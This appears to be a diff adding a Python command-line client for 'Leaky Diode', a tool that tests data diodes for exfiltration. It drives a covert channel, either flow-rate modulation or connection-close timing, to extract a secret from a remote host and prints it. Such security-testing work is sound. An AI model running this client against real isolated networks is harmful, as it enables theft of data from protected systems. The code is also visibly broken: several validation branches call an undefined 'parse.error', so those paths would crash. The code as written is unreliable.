@@ -1,0 +1,136 @@
+#!/usr/bin/env python3
+
+import time
+import argparse
+import sys
+
+from leaky_diode import LeakyClient, LeakyAttackMode
+
+
+# Fix so help message uses all available width
+import os, shutil
+os.environ['COLUMNS'] = str(shutil.get_terminal_size().columns)
+
+
+
+if __name__ == '__main__':
+
+    description = """Leaky Diode is a data exfiltration test tool for data diodes"""
+    parser = argparse.ArgumentParser(description=description)
+    
+    parser.add_argument('host', metavar='host', type=str, help='Remore host address')
+    parser.add_argument('port', metavar='port', type=int, help='Remote host port')
+    parser.add_argument('--mode', '-m', metavar='mode', 
+        choices=['flow', 'close'], 
+        default='flow',
+        help="Attack mode 'flow' or 'close' (default: %(default)s)"
+    )
+
+    # CLOSE MODE OPTIONS
+    parser.add_argument('--low_delay', metavar='delay', type=int,
+        default=10, # 10 seconds
+        help="""Close delay for low bits (default: %(default)ss) (only Close Mode)"""
+    )
+    parser.add_argument('--high_delay', metavar='delay', type=int,
+        default=30, # 30 seconds
+        help="""Close delay for high bits (default: %(default)ss) (only Close Mode)"""
+    )
+
+    # FLOW MODE OPTIONS
+    parser.add_argument('--low_rate', metavar='rate', type=int,
+        default=64,
+        help="""Tx rate for low bits (default: %(default)s KB/s)
+        (only Flow Mode)"""
+    )
+    parser.add_argument('--high_rate', metavar='rate', type=int,
+        default=300,
+        help="""Tx rate for high bits (default: %(default)s KB/s)
+        (only Flow Mode)"""
+    )
+  
+    parser.add_argument('--sample_time', metavar='time', type=float,
+        default=4.0,
+        help="Tx rate sampling interval (default: %(default)ss) (only Flow Mode)"
+    )
+    parser.add_argument('--settle_time', metavar='time', type=float,
+        default=10.0,
+        help="""Settle time between sending a bit request and the start of sampling 
+        (default: %(default)ss) (only Flow Mode)"""
+    )
+
+    # GENERAL OPTIONS
+    parser.add_argument('--partial',
+        dest='partial',
+        action='store_true',
+        help="Show partial results each time another byte from the secret is received"
+    )
+
+    args = parser.parse_args()
+    
+    # Validate arguments 
+    if args.low_rate <= 0:
+        parser.error("low_rate must be a positive integer")
+
+    if args.high_rate <= 0:
+        parser.error("high_rate must be a positive integer")
+
+    if args.high_rate <= args.low_rate:
+        parser.error("high_rate must be larger than low_rate")
+
+    if args.high_rate > 500:
+        parse.error("high_rate must be smaller than 500KB/s")
+
+    if args.low_delay < 0:
+        parse.error("low_delay must be a positive integer")
+    
+    if args.high_delay <= 0:
+        parse.error("high_delay must be a positive integer")
+
+    if args.high_delay <= args.low_delay:
+        parse.error("high_delay must be larger than low_delay")
+
+    if args.high_delay >= 300:
+        parse.error("high_delay must be smaller than 300s")
+
+    if args.settle_time < 0:
+        parse.error("settle time must be greater than 0")
+
+    if args.sample_time < 0:
+        parse.error("sample time must be greater than 0")
+    
+    # Listening address and port
+    if args.mode == 'flow':
+        client = LeakyClient(
+            args.host, args.port, 
+            LeakyAttackMode.FLOW_MODULATION, 
+            low=args.low_rate*1024,
+            high=args.high_rate*1024,
+            settle_time=args.settle_time, 
+            sample_time=args.sample_time
+        )
+
+    else:
+        client = LeakyClient(
+            args.host, args.port, 
+            LeakyAttackMode.CLOSE_DELAY,
+            low=args.low_delay*1000,
+            high=args.high_delay*1000
+        )
+
+    with client:
+        secret = b''
+        finished = False
+
+        while not finished:
+            try:
+                new_secret, finished = client.get_secret(block=True, timeout=2)
+            except ConnectionError as err:
+                print("ConnectionError: {}".format(err))
+                sys.exit(-1)
+
+            if new_secret != secret:
+                secret = new_secret
+                if args.partial or finished:
+                    print(secret)
+
+
